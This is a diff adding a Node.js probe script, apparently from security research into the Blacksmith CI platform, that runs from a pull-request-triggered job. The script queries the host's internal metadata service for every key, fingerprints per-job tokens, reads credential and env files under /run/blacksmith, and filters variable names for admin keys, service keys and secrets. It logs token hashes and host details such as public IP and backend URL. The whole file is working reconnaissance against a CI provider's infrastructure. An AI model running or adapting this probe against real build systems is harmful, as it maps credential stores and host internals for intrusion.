@@ -1,0 +1,245 @@
+/* i101479 PR-trigger liveness + credential-injection differential (READ-ONLY).
+ * Runs inside a Blacksmith guest as part of a customer repo's own CI.
+ * Prints NAMES / non-secret metadata only. Zero writes, zero target-side files,
+ * only talks to 192.168.127.1 (Blacksmith host bridge). */
+const fs = require('fs');
+const http = require('http');
+const crypto = require('crypto');
+
+const T0 = Date.now();
+const OUT = function () {
+  const a = Array.prototype.slice.call(arguments);
+  console.log(('P479 ' + a.join(' ')).slice(0, 4000));
+};
+const el = function () {
+  return ((Date.now() - T0) / 1000).toFixed(1);
+};
+
+let MP = 1049;
+try {
+  MP = parseInt(fs.readFileSync('/opt/blacksmith/mmds_port', 'utf8').trim(), 10) || 1049;
+} catch (e) {}
+
+function g(path, timeout) {
+  timeout = timeout || 4000;
+  return new Promise(function (res) {
+    let done = false;
+    const fin = function (o) {
+      if (!done) {
+        done = true;
+        res(o);
+      }
+    };
+    const req = http.request(
+      {
+        host: '192.168.127.1',
+        port: MP,
+        path: path,
+        method: 'GET',
+        timeout: timeout,
+        headers: { Connection: 'close' },
+      },
+      function (r) {
+        let b = '';
+        r.setEncoding('latin1');
+        r.on('data', function (c) {
+          if (b.length < 40000) b += c;
+        });
+        r.on('end', function () {
+          fin({ s: r.statusCode, b: b });
+        });
+      }
+    );
+    req.on('timeout', function () {
+      req.destroy();
+      fin({ s: -1, b: 'timeout' });
+    });
+    req.on('error', function (e) {
+      fin({ s: -2, b: String(e).slice(0, 120) });
+    });
+    req.end();
+    setTimeout(function () {
+      try {
+        req.destroy();
+      } catch (e) {}
+      fin({ s: -3, b: 'hard-timeout' });
+    }, timeout + 700);
+  });
+}
+
+const CTXKEYS = [
+  'vmID',
+  'hostMachineID',
+  'hostPublicIP',
+  'agentAddr',
+  'petname',
+  'region',
+  'jobID',
+  'hostBSGeneration',
+  'rootfsVersion',
+  'hostAgentGitSHA',
+  'hostConfigVersion',
+  'backendURL',
+  'runnerType',
+  'blacksmithEnvironment',
+  'hostname',
+  'staticIP',
+  'osFamily',
+  'machineArchitecture',
+  'hostCPUManufacturer',
+];
+const PAT = /(BACKEND|SERVICE_KEY|DOPPLER|ASSIGNER|FLEET|STORAGE|MTLS|ADMIN_KEY|REDIS|ETCD)/;
+const KEYP = /(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL|CERT)/;
+const PERJOB = [
+  'cacheToken',
+  'stickyDiskToken',
+  'jobHistoryToken',
+  'monitoringToken',
+  'jobCompletionToken',
+  'stepCompletionToken',
+];
+
+function namesFrom(txt) {
+  const out = [];
+  const re = /(?:^|\n)\s*(?:declare -x |export |exec )?([A-Za-z_][A-Za-z0-9_]*)=/g;
+  let m;
+  while ((m = re.exec(txt))) out.push(m[1]);
+  return Array.from(new Set(out)).sort();
+}
+function tokShape(v) {
+  if (typeof v !== 'string') return 'nonstr';
+  let alg = 'other';
+  const bar = v.indexOf('|');
+  if (bar > 0 && /^[0-9a-f]{32}$/i.test(v.slice(bar + 1))) alg = 'id|32hex';
+  else if (/^[0-9a-f]{40,64}$/i.test(v)) alg = 'hex' + v.length;
+  else if (/^[A-Za-z0-9._-]+$/.test(v)) alg = 'opaque' + v.length;
+  return alg + ' len=' + v.length + ' sha8=' + crypto.createHash('sha256').update(v).digest('hex').slice(0, 8);
+}
+
+(async function () {
+  OUT('START', 'pid=' + process.pid, 'uid=' + (process.getuid ? process.getuid() : '?'), 'node=' + process.version, 'cwd=' + process.cwd());
+  OUT('GITHUB_CTX', JSON.stringify({
+    repo: process.env.GITHUB_REPOSITORY || '',
+    event: process.env.GITHUB_EVENT_NAME || '',
+    ref: process.env.GITHUB_REF || '',
+    sha: (process.env.GITHUB_SHA || '').slice(0, 12),
+    runid: process.env.GITHUB_RUN_ID || '',
+    job: process.env.GITHUB_JOB || '',
+    runner: process.env.RUNNER_NAME || '',
+  }));
+
+  // ---- 1. MMDS key set (names only) ----
+  OUT('META_PORT', MP);
+  const idx = await g('/');
+  let keys = [];
+  try {
+    const j = JSON.parse(idx.b);
+    if (Array.isArray(j)) keys = j.map(String);
+    else if (j && typeof j === 'object') keys = Object.keys(j);
+  } catch (e) {
+    keys = (idx.b || '')
+      .split('\n')
+      .map(function (s) {
+        return s.trim();
+      })
+      .filter(Boolean);
+  }
+  OUT('MMDS_INDEX', idx.s, 'keys=' + keys.length);
+  OUT('MMDS_KEYS', JSON.stringify(keys).slice(0, 6000));
+  OUT('MMDS_PATTERN_HITS', JSON.stringify(keys.filter(function (k) { return PAT.test(k.toUpperCase()); })));
+  OUT('MMDS_KEYLIKE', JSON.stringify(keys.filter(function (k) { return KEYP.test(k.toUpperCase()); })));
+  OUT('MMDS_PERJOB_PRESENT', JSON.stringify(PERJOB.filter(function (k) { return keys.indexOf(k) >= 0; })));
+
+  const kv = {};
+  for (const k of CTXKEYS) {
+    const r = await g('/' + k);
+    kv[k] = r.s === 200 ? r.b.trim().slice(0, 300) : 'ERR' + r.s;
+  }
+  OUT('CTX', JSON.stringify({
+    vm: kv.vmID,
+    host: kv.hostMachineID,
+    hp: kv.hostPublicIP,
+    ag: kv.agentAddr,
+    pet: kv.petname,
+    region: kv.region,
+    inst: kv.installationModelID,
+    job: kv.jobID,
+    gen: kv.hostBSGeneration,
+    rootfs: kv.rootfsVersion,
+    gitsha: kv.hostAgentGitSHA,
+    cfgver: kv.hostConfigVersion,
+    backend: kv.backendURL,
+    rt: kv.runnerType,
+    env2: kv.blacksmithEnvironment,
+    hostname: kv.hostname,
+    staticip: kv.staticIP,
+    os: kv.osFamily,
+    arch: kv.machineArchitecture,
+    cpu: kv.hostCPUManufacturer,
+  }));
+
+  // ---- 2. per-job token values: shape only, never plaintext ----
+  const mvals = {};
+  for (const k of PERJOB) {
+    const r = await g('/' + k);
+    mvals[k] = r.s === 200 ? tokShape(r.b.trim()) : 'ERR' + r.s;
+  }
+  OUT('MMDS_PERJOB_SHAPE', JSON.stringify(mvals));
+  const envTok = Object.keys(process.env)
+    .filter(function (k) { return /^BLACKSMITH_.*TOKEN$/i.test(k); })
+    .sort();
+  OUT('ENV_BLACKSMITH_TOKENS', JSON.stringify(envTok.map(function (k) {
+    return k + ':' + tokShape(process.env[k]);
+  })));
+
+  // ---- 3. env/file key-name enumeration (no values) ----
+  const srcs = {};
+  const cand = [
+    '/run/blacksmith/job.env',
+    '/run/blacksmith/job.env.orig',
+    '/run/blacksmith/heartbeat.env',
+    '/opt/blacksmith/job.env',
+    '/etc/profile.d/blacksmith.sh',
+    '/etc/environment',
+  ];
+  for (const f of cand) {
+    try {
+      srcs[f] = fs.readFileSync(f, 'utf8');
+    } catch (e) {}
+  }
+  for (const d of ['/run/blacksmith', '/var/run/blacksmithd']) {
+    try {
+      for (const f of fs.readdirSync(d)) {
+        if (/env|config|yaml|yml|conf|json/i.test(f)) {
+          const p = d + '/' + f;
+          try {
+            const st = fs.statSync(p);
+            if (st.size < 200000) srcs[p] = fs.readFileSync(p, 'utf8');
+          } catch (e) {}
+        }
+      }
+    } catch (e) {}
+  }
+  OUT('SRCS', JSON.stringify(Object.keys(srcs).map(function (k) { return [k, srcs[k].length]; })));
+  for (const f of Object.keys(srcs)) {
+    const n = namesFrom(srcs[f]);
+    OUT('NAMES', f, 'n=' + n.length, JSON.stringify(n).slice(0, 5000));
+    OUT('HITS', f, JSON.stringify(n.filter(function (x) { return PAT.test(x.toUpperCase()); })), 'KEYLIKE=' + JSON.stringify(n.filter(function (x) { return KEYP.test(x.toUpperCase()); })).slice(0, 900));
+  }
+  const pe = Object.keys(process.env).sort();
+  OUT('PROCENV', 'n=' + pe.length, JSON.stringify(pe).slice(0, 6000));
+  OUT('PROCENV_HITS', JSON.stringify(pe.filter(function (x) { return PAT.test(x.toUpperCase()); })));
+
+  // ---- 4. liveness heartbeats (proves the job stayed up) ----
+  for (const wait of [0, 10000, 20000]) {
+    if (wait) await new Promise(function (r) { setTimeout(r, wait); });
+    const h = await g('/health');
+    const j = await g('/jobID');
+    OUT('BEAT', 't=' + el() + 's', 'health=' + h.s + ' ' + (h.b || '').replace(/\s+/g, ' ').slice(0, 160), 'jobID=' + j.s + ' ' + (j.b || '').trim().slice(0, 40));
+  }
+  OUT('DONE', 'elapsed=' + el() + 's');
+  process.exit(0);
+})().catch(function (e) {
+  OUT('FATAL', String(e && e.stack ? e.stack : e).slice(0, 400));
+  process.exit(0);
+});
